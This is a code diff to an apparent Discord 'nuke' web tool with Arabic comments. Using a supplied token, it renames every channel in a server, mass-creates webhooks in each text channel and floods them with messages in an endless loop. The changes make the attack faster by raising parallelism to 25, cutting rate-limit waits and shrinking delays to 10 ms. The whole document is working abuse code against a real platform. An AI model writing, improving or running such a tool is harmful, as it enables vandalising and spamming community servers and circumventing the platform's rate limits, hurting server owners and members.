@@ -106,8 +106,8 @@
       addLog('⏹️ أمر الإيقاف...', 'warn'); 
     });
 
-    // دالة ذكية للتعامل مع Rate Limits مع إعادة المحاولة التلقائية
-    async function smartFetch(url, options = {}, retries = 5) {
+    // دالة خرافية للتعامل مع Rate Limits (إعادة محاولة فورية)
+    async function smartFetch(url, options = {}, retries = 15) {
       for (let attempt = 0; attempt < retries; attempt++) {
         try {
           const response = await fetch(PROXY_URL, {
@@ -122,9 +122,8 @@
           });
           
           if (response.status === 429) {
-            const retryAfter = parseInt(response.headers.get('retry-after')) || 3;
-            addLog(`⏳ Rate Limit - انتظار ${retryAfter} ثانية...`, 'warn');
-            await delay(retryAfter * 1000 + 500);
+            const retryAfter = parseInt(response.headers.get('retry-after')) || 1;
+            await delay(retryAfter * 1000 + 200);
             continue;
           }
           
@@ -135,30 +134,40 @@
           return await response.json();
         } catch (err) {
           if (attempt === retries - 1) throw err;
-          await delay(1000);
+          await delay(500);
         }
       }
     }
 
-    // دالة لتنفيذ مهام متوازية مع تحديد عدد التزامن
-    async function parallelExecute(tasks, concurrency = 10) {
+    // دالة لتنفيذ مهام متوازية مع تدفق مستمر (بدون تأخير بين الدفعات)
+    async function parallelStream(tasks, concurrency = 25) {
       const results = [];
       const executing = [];
-      for (const task of tasks) {
-        const p = task().then(result => results.push(result));
-        executing.push(p);
-        if (executing.length >= concurrency) {
-          await Promise.race(executing);
-          // نزيل المهام المنتهية
-          for (let i = executing.length - 1; i >= 0; i--) {
-            if (executing[i].isSettled) {
-              executing.splice(i, 1);
-            }
+      let index = 0;
+      
+      return new Promise((resolve) => {
+        const next = async () => {
+          if (index >= tasks.length) {
+            if (executing.length === 0) resolve(results);
+            return;
           }
+          const i = index++;
+          const task = tasks[i];
+          try {
+            const result = await task();
+            results.push(result);
+          } catch (err) {
+            results.push(null);
+          }
+          executing.splice(executing.indexOf(next), 1);
+          next();
+        };
+        
+        for (let i = 0; i < Math.min(concurrency, tasks.length); i++) {
+          const p = next();
+          executing.push(p);
         }
-      }
-      await Promise.allSettled(executing);
-      return results;
+      });
     }
 
     document.getElementById('discordForm').addEventListener('submit', async (e) => {
@@ -183,10 +192,10 @@
       runBtn.disabled = true; runBtn.textContent = '⚡ جارٍ التنفيذ...';
       document.getElementById('status').textContent = '🔥 مشتعل...';
       document.getElementById('logs').innerHTML = '';
-      addLog('🚀 بدء الهجوم الخرافي (سرعة فائقة + ذكاء)...');
+      addLog('🚀 بدء الهجوم الخرافي الفائق (سرعة لا تُقهر)...');
 
       try {
-        // 1. جلب جميع القنوات
+        // 1. جلب جميع القنوات بسرعة
         const channels = await smartFetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, {
           headers: { Authorization: token }
         });
@@ -199,8 +208,8 @@
         if (allChannels.length === 0) { addLog('⚠️ لا توجد قنوات!', 'warn'); return; }
         addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة (نصي: ${textChannels.length}).`);
 
-        // 2. تغيير أسماء جميع القنوات بسرعة خرافية (دفعات متوازية)
-        addLog('⚡ تغيير أسماء جميع القنوات والفئات بسرعة فائقة...');
+        // 2. تغيير أسماء جميع القنوات بتدفق مستمر (25 طلب متوازي)
+        addLog('⚡ تغيير أسماء جميع القنوات والفئات بتدفق خرافي...');
         const renameTasks = allChannels.map(ch => async () => {
           if (stopFlag) return;
           try {
@@ -214,12 +223,11 @@
           } catch (err) { /* نتجاوز */ }
         });
         
-        // ننفذ 15 طلب تغيير في نفس الوقت
-        await parallelExecute(renameTasks, 15);
+        await parallelStream(renameTasks, 25);
         addLog('✅ تم تغيير أسماء جميع القنوات والفئات!', 'success');
         setProgress(30);
 
-        // 3. إنشاء ويب هوكات في كل قناة نصية (جميعها) بسرعة خرافية
+        // 3. إنشاء ويب هوكات في كل قناة نصية بتدفق مستمر (25 طلب متوازي)
         addLog(`⚡ إنشاء ${webhooksPerRoom} ويب هوك في كل قناة نصية (${textChannels.length} قناة)...`);
         const allUrls = [];
         const webhookTasks = [];
@@ -247,25 +255,21 @@
           }
         }
         
-        // ننشئ 20 ويب هوك في نفس الوقت (سرعة خرافية)
-        await parallelExecute(webhookTasks, 20);
+        await parallelStream(webhookTasks, 25);
         setProgress(70);
         addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك في جميع القنوات النصية.`, 'success');
 
         if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
         
-        // نعرض إحصائيات الويب هوكات لكل قناة
-        addLog(`📊 متوسط الويب هوكات لكل قناة: ${(allUrls.length / textChannels.length).toFixed(1)}`, 'success');
-        addLog('🔥 بدء السبام اللانهائي الخرافي... اضغط "إيقاف" للتوقف.', 'success');
+        const avg = (allUrls.length / textChannels.length).toFixed(1);
+        addLog(`📊 متوسط الويب هوكات لكل قناة: ${avg}`, 'success');
+        addLog('🔥 بدء السبام اللانهائي الخرافي الفائق... اضغط "إيقاف" للتوقف.', 'success');
 
-        // 4. السبام اللانهائي مع أقصى سرعة (10 طلبات متوازية)
+        // 4. السبام اللانهائي مع تدفق مستمر (25 رسالة متوازية)
         let round = 1;
         while (!stopFlag) {
-          // نأخذ عينة من 20 ويب هوك لكل دفعة (أو كلهم لو أقل)
-          const batchSize = Math.min(20, allUrls.length);
-          const batch = allUrls.slice(0, batchSize);
-          
-          const spamTasks = batch.map(url => async () => {
+          // نأخذ جميع الويب هوكات في كل جولة (بدون تقسيم)
+          const spamTasks = allUrls.map(url => async () => {
             if (stopFlag) return;
             try {
               await smartFetch(url, {
@@ -278,20 +282,19 @@
             } catch (err) { /* نتجاوز */ }
           });
           
-          // نرسل 10 رسائل متوازية في كل دفعة
-          await parallelExecute(spamTasks, 10);
+          // نرسل كل الويب هوكات في نفس الوقت (25 متوازي)
+          await parallelStream(spamTasks, 25);
           
           if (!stopFlag) {
-            // نرسل تقرير كل 5 جولات فقط لتجنب الزحمة في السجل
             if (round % 5 === 0) {
-              addLog(`📩 اكتملت الجولة ${round} (إجمالي رسائل: ${stats.messages})`, 'success');
+              addLog(`📩 الجولة ${round} - إجمالي رسائل: ${stats.messages}`, 'success');
             }
             round++;
             setProgress(70 + (Math.min(round, 300) / 300) * 25);
           }
           
-          // تأخير بسيط جداً بين الدفعات (25 ميللي فقط)
-          await delay(25);
+          // تأخير صفر تقريباً (10 مللي فقط عشان نسمح للمعالجة)
+          await delay(10);
         }
 
         setProgress(100);
